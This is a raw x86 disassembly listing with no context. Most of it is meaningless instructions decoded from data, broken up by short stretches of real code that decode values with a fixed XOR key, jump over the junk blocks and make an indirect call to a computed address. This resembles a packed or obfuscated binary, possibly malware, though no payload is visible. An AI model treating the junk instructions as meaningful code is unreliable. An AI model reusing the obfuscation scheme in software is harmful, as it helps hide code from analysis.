  41227b:	add    BYTE PTR [ebp+0xa],bh
  41227e:	push   edx
  41227f:	push   ecx
  412280:	xlat   BYTE PTR ds:[ebx]
  412281:	xlat   BYTE PTR ds:[ebx]
  412282:	and    al,0x4
  412284:	mov    dh,0xfa
  412286:	pop    esp
  412287:	nop
  412288:	pop    esi
  412289:	sbb    eax,0xbcee2ec9
  41228e:	or     bh,cl
  412290:	pop    edx
  412291:	(bad)  
  412292:	loop   0x41221d
  412294:	jae    0x412265
  412296:	popa   
  412297:	add    DWORD PTR [ebp-0x60b97c7e],ebx
  41229d:	pop    ecx
  41229e:	sbb    al,0xa9
  4122a0:	lods   al,BYTE PTR ds:[esi]
  4122a1:	rol    BYTE PTR [edi+eiz*4],0x2f
  4122a5:	(bad)  
  4122a6:	cmp    ebx,esi
  4122a8:	pop    ecx
  4122a9:	push   esp
  4122aa:	mov    bl,0xef
  4122ac:	adc    al,0x63
  4122ae:	cmp    BYTE PTR [ecx-0x6c],cl
  4122b1:	xor    eax,DWORD PTR [ebx]
  4122b3:	mov    edx,0x8b0c4589
  4122b8:	inc    ebp
  4122b9:	cld    
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx+0x545413ed],ch
  4122ef:	data16 bnd jle 0x41234f
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x412376
  4122fa:	retf   
  4122fb:	dec    esi
  4122fc:	pop    esi
  4122fd:	jle    0x412336
  4122ff:	inc    edx
  412300:	outs   dx,BYTE PTR ds:[esi]
  412301:	adc    esp,DWORD PTR [ebx]
  412303:	and    al,0x90
  412305:	fdivr  DWORD PTR ds:0xbb3da888
  41230b:	mov    bl,0x40
  41230d:	test   DWORD PTR [ebp-0x35262547],esp
  412313:	inc    eax
  412314:	outs   dx,DWORD PTR ds:[esi]
  412315:	(bad)  
  412316:	imul   ecx,DWORD PTR [ebx+0x257fd58d],0xffffffc4
  41231d:	fs int 0xda
  412320:	mov    edx,0x50b864f9
  412325:	stos   DWORD PTR es:[edi],eax
  412326:	sbb    BYTE PTR [ebp+ecx*8-0xe],cl
  41232a:	mov    al,ds:0xa809db06
  41232f:	scas   eax,DWORD PTR es:[di]
  412331:	mov    edx,eax
  412333:	push   eax
  412334:	sub    BYTE PTR [eax],bl
  412336:	jle    0x412395
  412338:	loopne 0x412353
  41233a:	xor    al,0x95
  41233c:	test   eax,0x4fa66ff6
  412341:	sbb    eax,edi
  412343:	pop    ebp
  412344:	pop    esp
  412345:	mov    edx,0x21a9cc2d
  41234a:	sbb    DWORD PTR [ecx-0x7e],ebp
  41234d:	daa    
  41234e:	pop    es
  41234f:	loopne 0x4122ee
  412351:	int3   
  412352:	pop    es
  412353:	sbb    al,0xbc
  412355:	lahf   
  412356:	sub    eax,0x7ed5eda2
  41235b:	sub    eax,0xaa1037b2
  412360:	fs stos BYTE PTR es:[edi],al
  412362:	cmp    eax,0x117d85e6
  412367:	lock and eax,0xb4b47baf
  41236d:	fdiv   DWORD PTR [edi-0x6]
  412370:	aam    0xa4
  412372:	pusha  
  412373:	mov    BYTE PTR [ebx],0x4b
  412376:	ja     0x4123ee
  412378:	jne    0x412366
  41237a:	sahf   
  41237b:	dec    edx
  41237c:	xchg   ecx,eax
  41237d:	push   eax
  41237e:	push   0xc5f2266f
  412383:	adc    edx,DWORD PTR [eax+0x56]
  412386:	pop    eax
  412387:	sbb    BYTE PTR ds:0xaa55adaa,0x82
  41238e:	das    
  41238f:	in     al,dx
  412390:	push   esp
  412391:	fwait
  412392:	outs   dx,DWORD PTR ds:[esi]
  412393:	stc    
  412394:	rol    esi,cl
  412396:	mov    esi,0x1e3d3a49
  41239b:	pusha  
  41239c:	addr16 mov cs,ebx
  41239f:	dec    edi
  4123a0:	mov    dh,0xa0
  4123a2:	adc    dh,BYTE PTR [ebp+0x75]
  4123a5:	bound  esi,QWORD PTR [eax]
  4123a7:	in     al,0x27
  4123a9:	mov    cl,0xad
  4123ab:	(bad)  
  4123ad:	pop    es
  4123ae:	pop    ds
  4123af:	pop    ds
  4123b0:	sar    al,1
  4123b2:	int    0xba
  4123b4:	call   0xe22c:0xac95c756
  4123bb:	(bad)  
  4123bc:	xlat   BYTE PTR ds:[ebx]
  4123bd:	sub    al,0xd6
  4123bf:	cmc    
  4123c0:	nop
  4123c1:	popa   
  4123c2:	jmp    0x374607d
  4123c7:	fwait
  4123c8:	sub    BYTE PTR [di+0x4e6b],dh
  4123cd:	and    ebx,esp
  4123cf:	or     al,0x68
  4123d1:	push   edi
  4123d2:	jl     0x412379
  4123d4:	xor    al,0x14
  4123d6:	and    esp,ebx
  4123d8:	add    sp,WORD PTR [ecx-0x3e778ced]
  4123df:	into   
  4123e0:	lds    edi,FWORD PTR [esi-0x77]
  4123e3:	ror    DWORD PTR [esi-0x7dcf8298],cl
  4123e9:	das    
  4123ea:	bound  edi,QWORD PTR [edi+0x3bb75f9e]
  4123f0:	add    ebp,edi
  4123f2:	test   al,0x30
  4123f4:	inc    edx
  4123f5:	ds fs mov ah,0xfd
  4123f9:	and    ebx,esi
  4123fb:	and    BYTE PTR [ebx-0x57],dl
  4123fe:	ja     0x4123a4
  412400:	aas    
  412401:	jno    0x4123ec
  412403:	xor    eax,0x97f2800e
  412408:	and    bh,BYTE PTR [edi+0x3bf0d439]
  41240e:	push   0xe5a1752d
  412413:	sti    
  412414:	imul   esp,DWORD PTR [edi+0x29],0xd6fc83f5
  41241b:	xchg   ebp,eax
  41241c:	sti    
  41241d:	cmp    eax,0xb22817d9
  412422:	mov    al,0x7f
  412424:	push   esi
  412425:	jbe    0x412471
  412427:	add    BYTE PTR [ebx],al
  412429:	xor    eax,DWORD PTR [eax]
  41242b:	gs loop 0x4124a6
  41242e:	outs   dx,DWORD PTR ds:[esi]
  41242f:	rcr    DWORD PTR [ebp-0x16443e1d],0xc3
  412436:	loop   0x412473
  412438:	pop    ds
  412439:	lods   al,BYTE PTR ds:[esi]
  41243a:	jle    0x412469
  41243c:	pop    esp
  41243d:	xor    bh,BYTE PTR [ebx+esi*1]
  412440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412441:	or     bh,BYTE PTR [ebx-0x2b5bd545]
  412447:	add    DWORD PTR [edx-0x27ab5c37],ebp
  41244d:	push   ss
  41244e:	cmp    DWORD PTR [ebx-0x7],0x6a
  412452:	leave  
  412453:	pop    DWORD PTR [ecx+0x13f352c4]
  412459:	cmp    dl,BYTE PTR [ecx-0x66f5711b]
  41245f:	mov    DWORD PTR [ebx-0x788e7aa2],esp
  412465:	lds    ebx,FWORD PTR [esi]
  412467:	inc    eax
  412468:	jo     0x4124c4
  41246a:	cmp    DWORD PTR [ebp-0x235639f4],ebx
  412470:	and    dh,BYTE PTR [esi]
  412472:	fstp   DWORD PTR [esi+0x3b]
  412475:	mov    ah,0xb
  412478:	mov    ds:0xbe12a199,eax
  41247d:	vmovhps xmm5,xmm0,QWORD PTR [ebx]
  412481:	das    
  412482:	movaps XMMWORD PTR ds:0x39926929,xmm7
  412489:	shl    DWORD PTR [esi+0x13b4df6a],cl
  41248f:	cmc    
  412490:	adc    al,0xbb
  412492:	(bad)  
  412494:	mov    eax,ds:0x1a3b7b72
  412499:	cmp    eax,0x146ae15a
  41249e:	pop    es
  41249f:	mov    cl,0x4b
  4124a1:	nop
  4124a2:	add    bh,al
  4124a4:	jns    0x41245e
  4124a6:	(bad)  
  4124a7:	outs   dx,BYTE PTR ds:[esi]
  4124a8:	in     eax,0x93
  4124aa:	mov    ds:0xbf0c2b36,eax
  4124af:	dec    eax
  4124b0:	inc    esp
  4124b1:	cld    
  4124b2:	xor    eax,0xeedc86ae
  4124b7:	cmp    bh,BYTE PTR [ebx]
  4124b9:	(bad)  
  4124ba:	pop    ds
  4124bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124bc:	dec    BYTE PTR [edx-0x69]
  4124bf:	fs addr16 pushf 
  4124c2:	jne    0x412530
  4124c4:	mov    esp,0x26880622
  4124c9:	xchg   ecx,eax
  4124ca:	mov    eax,ds:0x2e69f08d
  4124cf:	test   BYTE PTR [ecx-0x447e2647],ch
  4124d5:	pop    es
  4124d6:	ret    
  4124d7:	xor    al,0x79
  4124d9:	push   esp
  4124da:	pop    edx
  4124db:	add    al,0x3
  4124dd:	inc    ebp
  4124de:	or     BYTE PTR [ecx+0x458bf045],cl
  4124e4:	in     al,0x85
  4124e6:	ror    BYTE PTR [edi],0x84
  4124e9:	retf   0x4
  4124ec:	add    BYTE PTR [ecx+0xb6adc75],cl
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	or     al,0x6b
  4125a0:	sub    BYTE PTR [ecx+ebx*2+0x5d],al
  4125a4:	jle    0x412624
  4125a6:	pop    ecx
  4125a7:	jg     0x412627
  4125a9:	jle    0x4125fe
  4125ab:	shl    BYTE PTR [edi-0x2675ab90],cl
  4125b1:	mov    dh,ch
  4125b3:	or     DWORD PTR [ebx-0x779cbf62],esi
  4125b9:	(bad)  [ecx-0x3a]
  4125bc:	leave  
  4125bd:	cdq    
  4125be:	xor    cl,0x24
  4125c1:	mov    ds:0xa6eb2770,al
  4125c6:	xor    edi,DWORD PTR [ecx]
  4125c8:	call   0xdde1:0x829fbd9f
  4125cf:	or     dh,ch
  4125d1:	adc    DWORD PTR [ecx-0x36],esp
  4125d4:	out    dx,al
  4125d5:	mov    edx,0xff13ae69
  4125da:	clc    
  4125db:	dec    edx
  4125dc:	mov    esi,0x96e7d0f6
  4125e1:	mov    cs,WORD PTR [ecx-0x11]
  4125e4:	dec    ebx
  4125e5:	lock ret 
  4125e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125e8:	xor    bh,BYTE PTR [edi-0x7a]
  4125eb:	lock push DWORD PTR [eax]
  4125ee:	or     BYTE PTR [edi+ecx*2-0xb],0xc3
  4125f3:	repnz outs dx,DWORD PTR ds:[esi]
  4125f5:	push   esi
  4125f6:	ficomp DWORD PTR [esi]
  4125f8:	popf   
  4125f9:	jbe    0x412632
  4125fb:	jp     0x412644
  4125fd:	cmp    eax,DWORD PTR [ebp+0x21]
  412600:	retf   
  412601:	out    0x15,eax
  412603:	ins    DWORD PTR es:[edi],dx
  412604:	imul   DWORD PTR [eax+0x66]
  412607:	jbe    0x4125bb
  412609:	mov    ds:0xa9faab2f,al
  41260e:	mov    al,ds:0xbe5731f7
  412613:	ins    BYTE PTR es:[edi],dx
  412614:	outs   dx,DWORD PTR ds:[esi]
  412615:	and    BYTE PTR gs:[edx-0x47],0xf4
  41261a:	mov    ebp,0xf5057965
  41261f:	add    eax,0xabf184ae
  412624:	xlat   BYTE PTR ds:[ebx]
  412625:	push   ss
  412626:	or     cl,BYTE PTR [ebx]
  412628:	rcr    BYTE PTR [eax+0x14a7734e],cl
  41262e:	imul   ecx,DWORD PTR [edx-0x129ce8cd],0x52
  412635:	fs pop ss
  412637:	lea    edx,[eax+edi*2]
  41263a:	aas    
  41263b:	dec    ecx
  41263c:	stc    
  41263d:	sub    eax,0xd9760c20
  412642:	push   ecx
  412643:	xchg   ecx,eax
  412644:	push   es
  412645:	ins    BYTE PTR es:[edi],dx
  412646:	jl     0x412662
  412648:	fwait
  412649:	mov    ebp,0xd86f357e
  41264e:	inc    esp
  41264f:	jg     0x41267a
  412651:	fwait
  412652:	retf   
  412653:	js     0x412665
  412655:	(bad)  
  412656:	pop    edx
  412657:	sbb    eax,0x8e6f58eb
  41265c:	or     eax,0xc7413f2f
  412661:	ss int3 
  412663:	or     edi,DWORD PTR [ecx]
  412665:	(bad)  
  412666:	mov    ebx,0x95338edc
  41266b:	in     al,0xfc
  41266d:	ret    0x7719
  412670:	mov    esi,0x7afdfb09
  412675:	add    dl,BYTE PTR [ecx-0x47]
  412678:	or     ebp,eax
  41267a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41267b:	mov    dl,0xd3
  41267d:	xor    ch,BYTE PTR [ebp+ecx*1-0x2684890]
  412684:	push   edi
  412685:	sbb    BYTE PTR [edi-0x6b],al
  412688:	mov    ebp,0x676b00a9
  41268d:	ins    BYTE PTR es:[edi],dx
  41268e:	and    eax,0xa2a41021
  412693:	lods   eax,DWORD PTR ds:[esi]
  412694:	and    bh,al
  412696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412697:	xchg   BYTE PTR [esi-0x4ebfb9c9],ch
  41269d:	add    ebp,esi
  41269f:	fcomp  QWORD PTR [edi-0x1ac8aa8c]
  4126a5:	add    eax,0xf5e519cf
  4126aa:	sahf   
  4126ab:	sti    
  4126ac:	call   0xb69b:0x1d445ae7
  4126b3:	xchg   ecx,eax
  4126b4:	test   al,0xff
  4126b6:	inc    ebp
  4126b7:	sbb    BYTE PTR [esi+eax*8],0x98
  4126bb:	(bad)  
  4126bc:	or     DWORD PTR ds:0x9e80502f,ebp
  4126c2:	add    al,0x8b
  4126c4:	jo     0x4126ad
  4126c6:	or     DWORD PTR [eax*1-0x6ef15669],0x75
  4126ce:	lds    ecx,FWORD PTR [ecx]
  4126d0:	mov    edx,0xb631494d
  4126d5:	test   edi,ebx
  4126d7:	jns    0x4126d9
  4126d9:	dec    esp
  4126da:	lock jle 0x41274e
  4126dd:	daa    
  4126de:	xor    ah,ah
  4126e0:	mov    ebp,0xad4f1178
  4126e5:	or     eax,ebp
  4126e7:	pushf  
  4126e8:	repnz inc ebx
  4126ea:	and    DWORD PTR [ebx+0x6d2d6939],esi
  4126f0:	pop    eax
  4126f1:	fisub  DWORD PTR [edi-0x55]
  4126f4:	xor    ebx,DWORD PTR [ebp-0x747c90a]
  4126fa:	adc    ebp,DWORD PTR [edi+ebx*4-0x4e]
  4126fe:	pop    ebx
  4126ff:	out    dx,al
  412700:	xchg   BYTE PTR [eax],ch
  412702:	cvtdq2ps xmm1,XMMWORD PTR [ebp+0x3]
  412706:	in     eax,dx
  412707:	push   ebx
  412708:	or     bl,BYTE PTR [edi]
  41270a:	mov    esp,0xbbd7eb24
  41270f:	inc    esp
  412710:	jle    0x412731
  412712:	cwde   
  412713:	sbb    cl,BYTE PTR [edi+0x2b3eef03]
  412719:	test   eax,0xb52a24c2
  41271e:	mov    esp,0x32ad4130
  412723:	pushf  
  412724:	cmp    DWORD PTR [edi+0x7a47d267],0x8b2ec5b
  41272e:	ror    BYTE PTR [edi+0x7],0xf5
  412732:	sbb    eax,0x3a57f248
  412737:	or     al,0xa5
  412739:	rcl    BYTE PTR [ebx],0x8e
  41273c:	out    dx,eax
  41273d:	ja     0x4127a8
  41273f:	daa    
  412740:	arpl   WORD PTR [ebx],bx
  412742:	shl    DWORD PTR [ecx],0x8
  412745:	sub    eax,0xcb9b37b3
  41274a:	test   BYTE PTR [edi],al
  41274c:	fisttp WORD PTR [edx-0x68]
  41274f:	mov    ds:0xf6f59396,al
  412754:	pop    ecx
  412755:	rcl    esp,1
  412757:	mov    BYTE PTR [ecx+0x1dab6af6],bl
  41275d:	or     bh,BYTE PTR [ecx+0x3a]
  412760:	aad    0x69
  412762:	(bad)
  412765:	jp     0x412777
  412767:	out    dx,eax
  412768:	rcl    DWORD PTR [edi-0x2946521c],1
  41276e:	and    BYTE PTR ds:0xc427bf2e,dl
  412774:	pusha  
  412775:	out    dx,eax
  412776:	xor    eax,0x63d7e79d
  41277b:	ins    DWORD PTR es:[edi],dx
  41277c:	add    DWORD PTR [edx-0x10],edi
  41277f:	jmp    0x4127e5
  412781:	add    eax,edi
  412783:	pop    esp
  412784:	add    al,0xe9
  412786:	sbb    al,0xee
  412788:	loopne 0x412742
  41278a:	mov    ch,0x3d
  41278c:	xchg   edx,eax
  41278d:	xor    eax,ecx
  41278f:	jmp    0x41298f
  412794:	aaa    
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	and    edi,DWORD PTR [eax]
  4127a2:	test   eax,0x7e5f444d
  4127a7:	jle    0x412802
  4127a9:	jg     0x412829
  4127ab:	jle    0x412826
  4127ad:	and    eax,0x4c6e9388
  4127b2:	imul   eax,DWORD PTR [edi+0x26d17658],0xaacea42d
  4127bc:	dec    esp
  4127bd:	jbe    0x4127d4
  4127bf:	jo     0x412800
  4127c1:	ja     0x4127d3
  4127c3:	mov    al,ds:0x5fdfd4ce
  4127c8:	push   ebp
  4127c9:	lahf   
  4127ca:	scas   al,BYTE PTR es:[edi]
  4127cb:	sub    BYTE PTR [eax+0x44],0x39
  4127cf:	inc    edx
  4127d0:	sub    eax,0x9279e771
  4127d5:	and    eax,0xa55a13f7
  4127da:	sub    edx,esp
  4127dc:	jmp    0x9fa8b6d7
  4127e1:	and    al,ah
  4127e3:	loopne 0x4127a9
  4127e5:	mov    ebp,0x87ae50cf
  4127ea:	ss in  al,dx
  4127ec:	push   edi
  4127ed:	sub    eax,0x8c44ba14
  4127f2:	mov    eax,ds:0x2bef3523
  4127f7:	xor    eax,edi
  4127f9:	push   esi
  4127fa:	adc    DWORD PTR [ebx+0x6983dae2],esi
  412800:	add    DWORD PTR [ebp-0x5641dd18],edi
  412806:	lods   eax,DWORD PTR ds:[esi]
  412807:	aad    0x81
  412809:	aas    
  41280a:	cmp    cl,dh
  41280c:	pop    eax
  41280d:	push   es
  41280e:	aas    
  41280f:	inc    esi
  412810:	bound  eax,QWORD PTR [ebp-0x3792bf13]
  412816:	scas   al,BYTE PTR es:[edi]
  412817:	retf   
  412818:	cld    
  412819:	popa   
  41281a:	es mov eax,esp
  41281d:	jae    0x412871
  41281f:	rcl    DWORD PTR [eax],1
  412821:	mov    WORD PTR [ebx+0x54],cs
  412824:	jmp    0xc6de8d63
  412829:	xor    DWORD PTR [eax-0x64],0x1f
  41282d:	add    al,BYTE PTR [ebx+0x50]
  412830:	mov    bh,0x84
  412832:	inc    ebp
  412833:	dec    ecx
  412834:	lahf   
  412835:	mov    edx,0x7ca24667
  41283a:	jae    0x412823
  41283c:	cmc    
  41283d:	jecxz  0x412863
  41283f:	or     eax,0x11b1165
  412844:	adc    DWORD PTR [edi-0x72156c18],ebp
  41284a:	cmp    BYTE PTR [esi],bh
  41284c:	call   0x76e0:0x1e2b1894
  412853:	fsubr  DWORD PTR [ebx+ebx*4]
  412856:	adc    eax,0x1dbe6702
  41285b:	sbb    ch,BYTE PTR [ecx+0x32]
  41285e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41285f:	cmc    
  412860:	fwait
  412861:	jb     0x41289f
  412863:	or     eax,ebp
  412865:	xor    al,0xc4
  412867:	popf   
  412868:	dec    ebx
  412869:	paddq  mm0,mm5
  41286c:	xchg   ecx,eax
  41286d:	pop    ebx
  41286e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41286f:	xchg   edx,eax
  412870:	daa    
  412871:	popf   
  412872:	retf   0x3ea7
  412875:	sub    esp,edi
  412877:	inc    ebx
  412878:	dec    esi
  412879:	inc    eax
  41287a:	cmp    bl,BYTE PTR [eax+0x4f87fe4a]
  412880:	xchg   DWORD PTR [edi+0xa],edi
  412883:	aad    0x51
  412885:	ret    
  412886:	(bad)  
  412887:	(bad)  
  412889:	imul   edx,DWORD PTR [ecx],0x5b55629b
  41288f:	mov    al,0xf9
  412891:	aas    
  412892:	idiv   dh
  412894:	data16 (bad) 
  412896:	or     ebx,DWORD PTR [esi+0xe]
  412899:	aaa    
  41289a:	jecxz  0x41284b
  41289c:	and    DWORD PTR [esi],0x49ec51
  4128a2:	pushf  
  4128a3:	nop
  4128a4:	push   cs
  4128a5:	aas    
  4128a6:	push   esi
  4128a7:	add    eax,0xdabeb4b6
  4128ac:	cmp    bl,BYTE PTR es:[edx]
  4128af:	imul   esi,DWORD PTR ds:0xf58443de,0x7a
  4128b6:	stos   DWORD PTR es:[edi],eax
  4128b7:	mov    ah,bl
  4128b9:	jp     0x412866
  4128bb:	imul   ebx,DWORD PTR fs:[esi],0x91c206fe
  4128c2:	(bad)  
  4128c4:	pop    ds
  4128c5:	lds    esp,FWORD PTR [eax-0x78]
  4128c8:	and    DWORD PTR [eax-0x62],edi
  4128cb:	imul   eax,esp,0x5479c8f2
  4128d1:	mov    ah,BYTE PTR [edx-0x46]
  4128d4:	loope  0x4128e9
  4128d6:	or     al,0x59
  4128d8:	je     0x4128f5
  4128da:	idiv   esp
  4128dc:	adc    eax,DWORD PTR [eax]
  4128de:	sbb    eax,DWORD PTR cs:[edx]
  4128e1:	adc    DWORD PTR [ecx-0x20],ecx
  4128e4:	xchg   ecx,eax
  4128e5:	adc    DWORD PTR [esi-0x8411c62],ebp
  4128eb:	sub    DWORD PTR [esi+0x45],esi
  4128ee:	pop    esi
  4128ef:	imul   edx,DWORD PTR [eax-0x44323dd8],0x3ac29994
  4128f9:	mov    edi,0x222edce
  4128fe:	js     0x412953
  412900:	loope  0x412966
  412902:	ja     0x4128ae
  412904:	inc    edx
  412905:	lods   eax,DWORD PTR ds:[esi]
  412906:	jo     0x412924
  412908:	rcr    DWORD PTR [eax],0xd6
  41290b:	pop    esi
  41290c:	xchg   DWORD PTR [esi+0x48fe18c],edx
  412912:	into   
  412913:	adc    dh,bl
  412915:	mov    bl,0xa1
  412917:	ror    DWORD PTR [edi+edx*8+0x7a],cl
  41291b:	addr16 lahf 
  41291d:	jp     0x41292e
  41291f:	pop    edx
  412920:	jg     0x41292f
  412922:	jg     0x41296e
  412924:	or     al,0x36
  412926:	cdq    
  412927:	sub    al,0x6e
  412929:	sbb    DWORD PTR [eax+0x7],esp
  41292c:	imul   ebx,esp,0xbcfdd897
  412932:	push   0x6c2ce62d
  412937:	scas   eax,DWORD PTR es:[edi]
  412938:	gs icebp 
  41293a:	shl    BYTE PTR [ecx],cl
  41293c:	cdq    
  41293d:	icebp  
  41293e:	dec    eax
  41293f:	xchg   edx,eax
  412940:	dec    esp
  412941:	test   al,0x57
  412943:	repz xor DWORD PTR [ebp-0x3bbc23bf],edi
  41294a:	mov    esp,0x785766ec
  41294f:	jl     0x412969
  412951:	out    0x8a,al
  412953:	jae    0x4129b3
  412955:	mov    ebp,0xeb6be5c1
  41295a:	outs   dx,DWORD PTR ds:[esi]
  41295b:	mov    edi,0x5946d396
  412960:	jmp    0x412935
  412962:	std    
  412963:	push   cs
  412964:	jae    0x412980
  412966:	jge    0x412914
  412968:	sub    esp,DWORD PTR [ecx-0x77]
  41296b:	mov    ebx,0xb9bdd333
  412970:	inc    ebp
  412971:	mov    al,ds:0xacc8023d
  412976:	pop    ebp
  412977:	add    eax,0x33c45f30
  41297c:	xchg   ebp,eax
  41297d:	fild   WORD PTR [ecx+0x37]
  412980:	mov    edi,0xc75d28f9
  412985:	pop    edi
  412986:	xchg   esi,eax
  412987:	jb     0x412974
  412989:	(bad)
  41298d:	shr    BYTE PTR [edx],0x3
  412990:	(bad)  
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fmul   DWORD PTR [esi-0x58abcbcd]
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412a4c
  4129fb:	inc    ebp
  4129fc:	cdq    
  4129fd:	jns    0x412a04
  4129ff:	and    BYTE PTR [eax*2+0x64a4d53c],dl
  412a06:	in     eax,0x26
  412a08:	mov    DWORD PTR [ebx-0x28],eax
  412a0b:	cmp    al,0xd3
  412a0d:	fcmovb st,st(0)
  412a0f:	xor    ebp,DWORD PTR [esi]
  412a11:	jmp    0x4129dc
  412a13:	loopne 0x4129cd
  412a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a16:	sub    al,0xbb
  412a18:	mov    dh,0xd0
  412a1a:	inc    edi
  412a1b:	mov    dl,0x49
  412a1d:	and    DWORD PTR [edx+0x66],0x60
  412a21:	loopne 0x412a39
  412a23:	inc    edi
  412a24:	int    0x36
  412a26:	cmp    DWORD PTR [eax+0x28],esi
  412a29:	out    0xe5,al
  412a2b:	xor    edi,ebx
  412a2d:	or     DWORD PTR [edx],0xffffffc6
  412a30:	cwde   
  412a31:	and    BYTE PTR [esi+0x23],bh
  412a34:	xor    DWORD PTR [edi],edx
  412a36:	push   esp
  412a37:	adc    bh,ah
  412a39:	push   cs
  412a3a:	addr16 jbe 0x412a99
  412a3d:	ja     0x412a45
  412a3f:	(bad)  
  412a40:	gs sub eax,0x94441a25
  412a46:	jmp    0xcbf0:0xfccb3058
  412a4d:	push   cs
  412a4e:	mov    dh,bh
  412a50:	les    esp,FWORD PTR [ebx-0x25dca474]
  412a56:	popa   
  412a57:	mov    edx,0x40a83cbe
  412a5c:	int3   
  412a5d:	pop    edi
  412a5e:	jg     0x412a12
  412a60:	push   ss
  412a61:	cwde   
  412a62:	pusha  
  412a63:	aam    0x52
  412a65:	rcr    ch,1
  412a67:	mov    bl,BYTE PTR [esi]
  412a69:	jmp    0x75e9ee08
  412a6e:	fld    QWORD PTR [ebp-0x3b]
  412a71:	mov    dl,0xb9
  412a73:	push   0xffffffc2
  412a75:	sub    DWORD PTR [ecx+esi*8+0x5f],ebp
  412a79:	mov    dh,0x6
  412a7b:	call   0x3edb317b
  412a80:	stos   BYTE PTR es:[edi],al
  412a81:	xchg   ebp,eax
  412a82:	add    al,0x4b
  412a84:	ffree  st(4)
  412a86:	mov    esp,DWORD PTR [ebx]
  412a88:	mov    dh,0xcb
  412a8a:	jbe    0x412a54
  412a8c:	adc    ch,BYTE PTR [ecx+0x74]
  412a8f:	fbld   TBYTE PTR [ebp+0x53]
  412a92:	inc    ebx
